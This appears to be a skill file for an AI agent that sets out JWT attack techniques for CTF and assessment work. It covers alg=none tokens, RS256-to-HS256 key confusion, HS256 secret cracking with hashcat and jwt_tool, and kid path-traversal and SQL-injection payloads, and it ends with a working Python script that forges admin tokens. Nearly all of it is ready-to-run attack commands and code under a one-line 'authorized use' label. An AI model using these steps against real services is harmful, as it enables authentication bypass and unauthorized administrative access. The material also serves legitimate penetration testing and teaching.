name: jwt-attack
description: JWT (JSON Web Token) attack techniques — algorithm confusion (none/RS→HS), HS256 secret brute-force, kid injection, and claim forgery. Targets the pattern where a JWT gates admin but the HS256 secret is weak/recoverable. "Forge the token = instant admin".
---

# JWT Attack

Authorized CTF/assessment use. A JWT gates access; its weakness is almost always the signing scheme. Decode it, pick the right attack, forge an admin token. The secret/algorithm is the crown jewel — hunt it before brute-forcing the app.

## 1. Decode & fingerprint first

```bash
# split & decode
echo "<JWT>" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```
Read the header: `alg` (HS256/RS256/none), `kid`, `typ`. Read the payload: `sub`, `role`, `is_admin`, `exp`, `username`.

## 2. Algorithm attacks (try in this order)

**A. `none` algorithm (alg=none):** if the server accepts it, the signature is ignored:
```
header: {"alg":"none","typ":"JWT"}
payload: {"username":"admin","is_admin":true,"sub":"admin"}
signature: (empty)
```
Send `header.payload.` (trailing dot, empty signature). Many libs historically accepted this.

**B. RS256 → HS256 confusion (the classic):** if the app verifies with a PUBLIC key but accepts HS256, sign the token with the PUBLIC key as if it were an HMAC secret:
```
# get the public key (often at /.well-known/jwks.json, /public.pem, or an endpoint)
python3 jwt_tool.py <JWT> -X k -pk public.pem     # key confusion
# or manual: HS256 with the PEM-encoded public key as the secret
```
The server does `verify(token, pubkey)` — as HMAC it uses the same pubkey bytes as the secret → signature matches → forged admin.

**C. HS256 secret brute-force (weak secret):** if alg=HS256, brute the secret:
```bash
hashcat -m 16500 <jwt> /usr/share/wordlists/rockyou.txt
# or jwt_tool
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
```
Common weak secrets: `secret`, `key`, `123456`, `password`, the app name, a short string.

**D. `kid` injection (path traversal → file content as the HMAC secret):** if the header `kid` selects a key file, the backend often does `file_get_contents('/keys/'.$kid)` — the FILE'S CONTENT becomes the HMAC secret. Path-traverse `kid` to a known, readable file inside the app, then sign with that file's content:
```
# kid → a known readable file (its bytes are the HMAC key)
"kid": "../../../../etc/passwd"              → sign with the /etc/passwd content
"kid": "../vendor/composer/installed.json"   → sign with the installed.json content (app-local, always readable)
"kid": "/dev/null"                            → sign with empty secret
```
The move: (1) read the file yourself (LFI/download/error) to get its EXACT bytes; (2) re-sign a forged admin token using those bytes as the HMAC secret; (3) send with the same traversal `kid`. If the app reads the key via a path you control, the "secret" is whatever file you can point it at — you don't need the real key.
**SQLi kid** (when `kid` hits a DB): `"kid": "x' UNION SELECT 'mysecret'--"` → the selected "key" becomes `mysecret` → sign with `mysecret`.

## 3. Claim forgery (once the key/alg is owned)

Forge the admin token:
```python
import hmac, hashlib, base64, json
def b64(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
h = b64({"alg":"HS256","typ":"JWT"})
p = b64({"sub":"admin","username":"admin","is_admin":True,"role":"admin"})
sig = base64.urlsafe_b64encode(hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()).rstrip(b'=').decode()
print(f"{h}.{p}.{sig}")
```
Set as the `Authorization: Bearer` / session cookie → admin → flag.

## 4. Common JWT locations
- `Authorization: Bearer <jwt>` header
- `token` / `jwt` / `access_token` cookie
- a `?token=` query param or response body

## Cross-cutting
- **The header tells you the attack.** Read `alg` and `kid` first; the attack is chosen from them.
- **Weak HS256 secret is the most common CTF JWT vuln** — brute it early with a focused wordlist before reaching for heavier tools.
- **Self-verify:** decode your forged token and confirm the server returns admin data (200 + admin content) before relying on it.
